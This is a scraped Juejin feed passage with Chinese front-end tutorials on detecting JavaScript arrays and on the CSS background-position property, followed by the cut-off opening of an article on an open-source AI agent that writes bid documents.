  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:02:33.000Z" title="Fri Dec 05 2025 03:02:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">传统方案</h3>
<h4 data-id="heading-1">1. Object.prototype.toString.call 方法</h4>
<p><strong>原理</strong>：通过调用 <code>Object.prototype.toString.call(obj)</code> ，判断返回值是否为  <code>[object Array]</code> 。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isArray</span>(<span class="hljs-params">obj</span>){
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj) === <span class="hljs-string">'[object Array]'</span>;
}
</code></pre>
<p> 
<strong>缺陷</strong>：</p>
<ul>
<li>
<p>ES6 引入 <code>Symbol.toStringTag</code> 后，可被人为篡改。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {
  [<span class="hljs-title class_">Symbol</span>.<span class="hljs-property">toStringTag</span>]: <span class="hljs-string">'Array'</span>
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">toString</span>.<span class="hljs-title function_">call</span>(obj)); <span class="hljs-comment">// 输出 [object Array]</span>
</code></pre>
</li>
<li>
<p>若开发通用型代码（如框架、库），该漏洞会导致判断失效。</p>
</li>
</ul>
<h4 data-id="heading-2">2. instanceof 方法</h4>
<p><strong>原理</strong>：判断对象原型链上是否存在 <code>Array</code> 构造函数。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">isArray</span>(<span class="hljs-params">obj</span>){
  <span class="hljs-keyword">return</span> obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>;
}
</code></pre>
<p><strong>缺陷</strong>：</p>
<ul>
<li>
<p>可通过 <code>Object.setPrototypeOf</code> 篡改原型链，导致误判。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj = {};
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, <span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// 输出 true，但 obj 并非真正数组</span>
</code></pre>
</li>
<li>
<p>跨 iframe 场景失效。不同 iframe 中的 <code>Array</code> 构造函数不共享，导致真数组被误判为非数组。例如：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> frame = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'iframe'</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Array2</span> = frame.<span class="hljs-property">contentWindow</span>.<span class="hljs-property">Array</span>;
<span class="hljs-keyword">const</span> arr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array2</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// 输出 false，但 arr 是真正数组</span>
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">ES6 原生方法</h3>
<p><strong>方法</strong>：使用 <code>Array.isArray</code> 静态方法。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(arr));
</code></pre>
<p> 
<strong>优势</strong>：</p>
<ul>
<li>
<p>该方法由JavaScript引擎内部实现，直接判断对象是否由 Array 构造函数创建，不受原型链、 Symbol.toStringTag  或跨 iframe 影响；</p>
</li>
<li>
<p>完美解决所有边界场景。</p>
</li>
</ul>
<h3 data-id="heading-4">总结</h3>
<p>判断数组的方法中 <code>Array.isArray</code> 是唯一准确且无缺陷的方案。其他方法（如<code>Object.prototype.toString.call</code>、<code>instanceof</code>）均存在局限性，仅在特定场景下可用。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CSS属性：background-position]]></title>    <link>https://juejin.cn/post/7579849892614144036</link>    <guid>https://juejin.cn/post/7579849892614144036</guid>    <pubDate>2025-12-05T03:04:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579849892614144036" data-draft-id="7579846685071933494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CSS属性：background-position"/> <meta itemprop="keywords" content="CSS"/> <meta itemprop="datePublished" content="2025-12-05T03:04:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="tj"/> <meta itemprop="url" content="https://juejin.cn/user/4218165277233182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CSS属性：background-position
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4218165277233182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    tj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:04:07.000Z" title="Fri Dec 05 2025 03:04:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>background-position</strong>是CSS中用于设置背景图片初始位置的属性。这个位置是相对于由<strong>background-origin</strong>定义的位置图层的。通过这个属性，可以精确控制背景图像在元素中的位置，无论是水平还是垂直方向。</p>
<p>使用background-position</p>
<p><strong>background-position</strong>属性可以接受多种类型的值，包括关键字、百分比或长度值。这些值定义了背景图像相对于元素盒子模型边界的x/y坐标。例如：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 关键字值 */</span>
<span class="hljs-attribute">background-position</span>: top;
<span class="hljs-attribute">background-position</span>: bottom;
<span class="hljs-attribute">background-position</span>: left;
<span class="hljs-attribute">background-position</span>: right;
<span class="hljs-attribute">background-position</span>: center;
<span class="hljs-comment">/* 百分比值 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">25%</span> <span class="hljs-number">75%</span>;
<span class="hljs-comment">/* 长度值 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>;
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">1cm</span> <span class="hljs-number">2cm</span>;
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">10ch</span> <span class="hljs-number">8em</span>;
<span class="hljs-comment">/* 多个背景图像 */</span>
<span class="hljs-attribute">background-position</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span>, center;
<span class="hljs-comment">/* 边缘偏移值 */</span>
<span class="hljs-attribute">background-position</span>: bottom <span class="hljs-number">10px</span> right <span class="hljs-number">20px</span>;
</code></pre>
<p>语法和值</p>
<ul>
<li><strong>单个值</strong>：如果只指定了一个值，第二个值默认是<strong>center</strong>。</li>
<li><strong>两个值</strong>：第一个值通常是水平位置，第二个值是垂直位置。如果两个值都是关键字，比如<em>top left</em>，它们的顺序不重要，因为浏览器会重新排序。</li>
<li><strong>三个值</strong>：两个关键字值和一个偏移量，其中偏移量是前面关键字值的偏移。</li>
<li><strong>四个值</strong>：两个定义X和Y的关键字值，以及两个偏移量。</li>
</ul>
<p>百分比值的计算</p>
<p>百分比值是相对于容器的大小减去背景图像大小的。例如，<em>background-position: 25% 75%</em> 表示图像上的左侧25%和顶部75%的位置将放置在距容器左侧25%和距容器顶部75%的容器位置。</p>
<p>示例</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-comment">/* 使用 `background` 缩写 */</span>
exampleone {
 <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>) <span class="hljs-number">#ffee99</span> <span class="hljs-number">2.5cm</span> bottom no-repeat;
}
exampletwo {
 <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>) <span class="hljs-number">#ffee99</span> left <span class="hljs-number">4em</span> bottom <span class="hljs-number">1em</span> no-repeat;
}
<span class="hljs-comment">/* 多背景图片：每个图片依次和相应的 `background-position` 匹配 */</span>
examplethree {
 <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">"startransparent.gif"</span>), <span class="hljs-built_in">url</span>(<span class="hljs-string">"catfront.png"</span>);
 <span class="hljs-attribute">background-position</span>: <span class="hljs-number">0px</span> <span class="hljs-number">0px</span>, right <span class="hljs-number">3em</span> bottom <span class="hljs-number">2em</span>;
}
</code></pre>
<p>在上述示例中， <em>.exampleone</em>和 <em>.exampletwo</em>使用了<em>background</em>缩写来设置背景图像及其位置，而 <em>.examplethree</em>则演示了如何为两个不同的背景图片指定位置。</p>
<p>浏览器兼容性</p>
<p><strong>background-position</strong>属性在所有现代浏览器中都得到了支持，包括Chrome、Firefox、Safari、Opera等。对于旧版本的IE，可能需要额外的兼容性考虑。</p>
<p>通过使用<strong>background-position</strong>属性，开发者可以灵活地控制背景图像的显示方式，无论是固定在某个位置，还是相对于元素的边缘进行偏移。这为页面设计提供了更多的创意空间和视觉效果的可能性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[标书智能体（三）——生成标书正文代码+提示词]]></title>    <link>https://juejin.cn/post/7579892134816727075</link>    <guid>https://juejin.cn/post/7579892134816727075</guid>    <pubDate>2025-12-05T03:05:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579892134816727075" data-draft-id="7579887768227627042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="标书智能体（三）——生成标书正文代码+提示词"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2025-12-05T03:05:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户246293206767"/> <meta itemprop="url" content="https://juejin.cn/user/3871844943530826"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            标书智能体（三）——生成标书正文代码+提示词
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3871844943530826/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户246293206767
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:05:59.000Z" title="Fri Dec 05 2025 03:05:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>用Python+React打造一个开源的AI写标书智能体~</p>
<p><strong>完整代码已开源</strong></p>
<p>代码很多，文章只放主要代码和提示词，完整代码可以查看开源项目</p>
<p>Github： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fyibiaoai%2Fyibiao-simple" target="_blank" title="https://github.com/yibiaoai/yibiao-simple" ref="nofollow noopener noreferrer">github.com/yibiaoai/yi…</a></p>
<p>Gitee： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fyibiao-ai%2Fyibiao-simple" target="_blank" title="https://gitee.com/yibiao-ai/yibiao-simple" ref="nofollow noopener noreferrer">gitee.com/yibiao-ai/y…</a></p>
<p>今天是第三期，根据生成好的提纲，填充标书内容。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c029176a80ef4a96af10c4b1c6e7cbd3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3MjQ2MjkzMjA2NzY3:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765508759&amp;x-signature=XKaVIeY7WYL%2BDCDQbm1fGgF5xSY%3D" alt="" loading="lazy"/></p>
<p>正文生成，并不像上一节讲的提纲生成那么复杂，核心难点只有两个：</p>
<ul>
<li><strong>标书需求字数太多：</strong> 一份标书动辄几万几十万字，直接让AI生成必然行不通。有了上一节生成提纲的经验，我们已经知道答案了，那就是把正文也打碎，让AI按照提纲的叶子节点，逐节生成正文。</li>
<li><strong>上下文不连贯，或内容重复：</strong> 这就引出了我们第二个难点，分布生成，多部分内容之间不连贯是肯定的，可以更大的问题是，都是基于一份招标文件生成的技术方案，很可能生成意思过于相近的内容，俗称车轱辘话。
下面，咱们就来逐项分析一下，如何解决上述难点。</li>
</ul>
<h2 data-id="heading-0">一、获取生成内容所需信息</h2>
<p>从前端拆分提纲，提纲的每一个叶子节点都发起一个生成请求，需要传递以下参数</p>
